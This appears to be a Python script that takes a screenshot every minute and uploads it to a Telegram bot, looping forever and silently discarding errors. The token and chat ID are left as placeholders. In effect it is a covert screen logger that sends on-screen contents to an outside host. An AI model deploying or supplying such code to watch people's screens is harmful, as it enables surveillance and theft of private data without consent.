import mss 
import time
import requests

CHAT_ID=secret
TELEGRAM_BOT_TOKEN=secret

def main():
  photo = 'screenshot.png'
  while 1:
    createScreenhot(photo)
    sendPhoto(photo, CHAT_ID)
    time.sleep(1 * 60)

def createScreenhot(file: str):
    try:
        with mss.mss() as sct:
            screenshot = sct.shot(output="screenshot.png")
    except Exception as e:
        _ = 0

def sendPhoto(photo: str, chatId: str):
    try:
        url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto'
        files = {'photo': open(photo, 'rb')}
        data = {'chat_id': chatId}
        response = requests.post(url, files=files, data=data)
    except Exception as e:
        _ = 0

main()
